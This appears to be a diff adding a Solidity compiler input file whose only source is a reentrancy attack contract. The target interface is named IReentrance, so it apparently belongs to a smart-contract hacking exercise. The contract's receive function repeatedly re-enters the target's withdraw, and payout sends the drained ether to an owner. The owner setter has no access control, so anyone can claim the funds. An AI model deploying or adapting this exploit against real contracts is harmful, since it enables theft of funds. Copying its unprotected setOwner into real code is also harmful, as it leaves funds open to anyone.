@@ -1,0 +1,36 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/ReentrancyAttacker.sol": {
+      "content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IReentrance {\r\n    function donate(address _to) external payable; \r\n    function withdraw(uint256 _amount) external;\r\n}\r\n\r\ncontract ReentrancyAttacker {\r\n    address public owner;\r\n\r\n    IReentrance targetContract;\r\n\r\n    constructor(){\r\n        owner = msg.sender;\r\n    }\r\n\r\n    \r\n    function attack() external payable {\r\n       require(msg.value > 0, \"Must send ETH\");\r\n        // targetContract.donate{value: msg.value}(address(this));\r\n        targetContract.withdraw(0.001 ether); // same amount\r\n    }\r\n\r\n    function donate() external payable {\r\n        targetContract.donate{value: 0.001 ether}(address(this));\r\n    }\r\n\r\n    function setTarget(address _target) public{\r\n        targetContract = IReentrance(_target);\r\n    }\r\n\r\n    function setOwner(address _newowner) public {\r\n        owner = _newowner;\r\n    }\r\n    \r\n    receive() external payable{\r\n        if(address(targetContract).balance >= 0.001 ether){\r\n            targetContract.withdraw(.001 ether);\r\n        }\r\n    }\r\n\r\n    function payout() external {\r\n        payable(owner).transfer(address(this).balance);\r\n    }\r\n}"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "evmVersion": "paris",
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
